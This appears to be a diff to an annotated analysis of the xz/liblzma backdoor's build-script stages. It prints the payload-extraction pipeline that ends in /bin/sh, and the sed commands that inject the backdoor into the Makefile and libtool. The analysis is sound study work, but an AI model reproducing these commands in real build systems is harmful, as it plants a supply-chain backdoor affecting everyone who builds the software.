@@ -129,9 +129,16 @@ export i="((head -c +1024 >/dev/null) && head -c +2048 &&
 | /bin/sh
 ####World####
 ```
+```sh
+(xz -dc $srcdir/tests/files/good-large_compressed.lzma\
+| eval $i\
+| tail -c +31233\
+| tr "\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113" "\0-\377")\
+| xz -F raw --lzma1 -dc\
+| /bin/sh
+```
 - If OS is not based on Linux, terminate script
 - Set `srcdir`
-- `(xz -dc $srcdir/tests/files/good-large_compressed.lzma | eval $i|tail -c +31233 | tr \114-\321\322-\377\35-\47\14-\34\0-\13\50-\113" "\0-\377") | xz -F raw --lzma1 -dc|/bin/sh`
 - Deofuscate `tests/files/good-large_compressed.lzma`
 
 
@@ -339,8 +346,12 @@ cat $f1 | tail -c +$(echo $vs | cut -d: -f2) + 7 | haed -c +$(echo $ve | cut -d:
 ```sh
         sed -i "/$j/i$b" src/liblzma/Makefile || true
 ```
+```sh
+        sed -i "/^ACLOCAL_M4 = \$(top_srcdir)\/aclocal.m4/iam__test = bad-3-corrupt_lzma2.xz" src/liblzma/Makefile || true
+```
 - Insert `$b` to `$j` in `src/liblzma/Makefile`
 - `j="^ACLOCAL_M4 = \$(top_srcdir)\/aclocal.m4"`
+- `U="bad-3-corrupt_lzma2.xz"`
 - `b="am__test = $U"`
 
 ```sh
@@ -350,7 +361,9 @@ cat $f1 | tail -c +$(echo $vs | cut -d: -f2) + 7 | haed -c +$(echo $ve | cut -d:
 ```
 - Insert `$b` to `$w` in `src/liblzma/Makefile`
 - `w="^am__install_max ="`
-- `b="am__test = $U"`
+- `gl_path_map='tr "\t \-_" " \t_\-"'`
+- `` d=`echo $gl_path_map | sed 's/\\\/\\\\\\\\/g'` ``
+- `b="am__strip_prefix = $d"`
 
 ```sh
         b="am__dist_setup = \$(am__strip_prefix) | xz -d 2>/dev/null | \$(SHELL)"
@@ -361,8 +374,8 @@ cat $f1 | tail -c +$(echo $vs | cut -d: -f2) + 7 | haed -c +$(echo $ve | cut -d:
 ```
 - Insert `$b` to `$E` in `src/liblzma/Makefile`
 - Insert `$s` to `$Q` in `src/liblzma/Makefile`
-- `E=$z`
 - `z="^am__uninstall_files_from_dir = {"`
+- `E=$z`
 - `b="am__dist_setup = \$(am__strip_prefix) | xz -d 2>/dev/`
 - `Q="^am__vpath_adj_setup ="`
 - `b="\$(top_srcdir)/tests/files/\$(am__test)"`
@@ -401,6 +414,8 @@ am__test_dir = $(top_srcdir)/tests/files/$(am__test)
   - This early invocation of the backdoor setup lets it run while the tables are still writable, allowing the backdoor to replace the entry for `RSA_public_decrypt` with its own version.
 - `L="^all: all-recursive$"`
 - `j="liblzma_la_LDFLAGS += $h"`
+- `h="-Wl,--sort-section=name,-X"`
+- `if` condition makes `h="-Wl,--sort-section=name,-X,-z,now"`
 
 ```sh
         sed -i "s/$O/$C/g" libtool || true
@@ -408,6 +423,9 @@ am__test_dir = $(top_srcdir)/tests/files/$(am__test)
 - libtool `pic_flag=" -fPIC -DPIC"` changes
 - To libtool `pic_flag=" -fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections"`
 - Disable linker optimizations that could get in the way of subterfuge.
+- `O="^pic_flag=\" -fPIC -DPIC\"$"`
+- `P="-fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections"`
+- `C="pic_flag=\" $P\""`
 
 ```sh
         k="AM_V_CCLD = @echo -n \$(LTDEPS); \$(am__v_CCLD_\$(V))"
